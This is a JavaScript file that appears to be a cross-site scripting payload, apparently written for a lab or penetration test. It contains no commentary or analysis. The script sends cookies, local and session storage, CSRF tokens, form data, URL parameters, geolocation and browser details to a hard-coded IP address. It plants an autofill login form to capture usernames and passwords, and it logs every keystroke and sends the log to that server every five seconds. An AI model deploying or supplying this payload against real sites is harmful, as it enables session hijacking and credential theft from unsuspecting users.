let server = "http://192.168.45.156";

// Exfiltrate local storage, session storage, cookies, and browser information
let exfilData = (key, value) => fetch(`${server}/exfil?${key}=${encodeURIComponent(value)}`);
exfilData("data", JSON.stringify(localStorage));
exfilData("data", JSON.stringify(sessionStorage));
exfilData("data", document.cookie);

// Exfiltrate browser information
exfilData("user_agent", navigator.userAgent);
exfilData("platform", navigator.platform);
exfilData("language", navigator.language);
exfilData("online_status", navigator.onLine);
exfilData("screen_resolution", `${window.screen.width}x${window.screen.height}`);
exfilData("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);

// Check for CSRF tokens and exfiltrate them
let csrfTokenSelectors = [
  "meta[name='csrf-token']",
  "input[name='csrfmiddlewaretoken']",
  "input[name='csrf_token']",
  "meta[name='xsrf-token']",
  "input[name='xsrfmiddlewaretoken']",
  "input[name='xsrf_token']",
  "meta[name='X-CSRF-Token']",
  "input[name='X-CSRF-Token']"
];
csrfTokenSelectors.forEach(selector => {
  let tokenElement = document.querySelector(selector);
  if (tokenElement) {
    let tokenValue = tokenElement.content || tokenElement.value;
    if (tokenValue) {
      exfilData("csrf_token", tokenValue);
    }
  }
});

// Exfiltrate other potentially sensitive information
// Get all form data
let forms = document.querySelectorAll("form");
forms.forEach(form => {
  let formData = new FormData(form);
  for (let [key, value] of formData.entries()) {
    exfilData(`form_${key}`, value);
  }
});

// Get all URL parameters
let urlParams = new URLSearchParams(window.location.search);
urlParams.forEach((value, key) => {
  exfilData(`url_param_${key}`, value);
});

// Get geolocation if available
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(position => {
    exfilData("geolocation", JSON.stringify({ lat: position.coords.latitude, lon: position.coords.longitude }));
  });
}

// Get browser history length
exfilData("history_length", window.history.length);

// Get browser plugins
let plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(", ");
exfilData("plugins", plugins);

// Get referrer URL
exfilData("referrer", document.referrer);

// Get current URL
exfilData("current_url", window.location.href);

// Create a form that autofills with username and password
let autofillForm = document.createElement("form");
autofillForm.style.position = "fixed";
// autofillForm.style.opacity = "0";
autofillForm.innerHTML = `
  <label for="username">Username:</label>
  <input type="text" id="username" name="username" value=""><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password" value=""><br>
  <button type="submit">Submit</button>
`;
let body = document.getElementsByTagName("body")[0];
body.append(autofillForm);

// Capture username and password after 5 seconds
setTimeout(() => {
  let username = document.getElementById("username").value;
  let password = document.getElementById("password").value;
  fetch(`${server}/k?u=${username}&p=${password}`);
}, 5000);

// Log keystrokes and store them in a buffer
let keystrokeBuffer = [];
function logKey(event) {
  keystrokeBuffer.push(event.key);
}

document.addEventListener('keydown', logKey);

// Send buffered keystrokes every 5 seconds
setInterval(() => {
  if (keystrokeBuffer.length > 0) {
    fetch(`${server}/k?keys=${encodeURIComponent(keystrokeBuffer.join(""))}`);
    keystrokeBuffer = [];
  }
}, 5000);
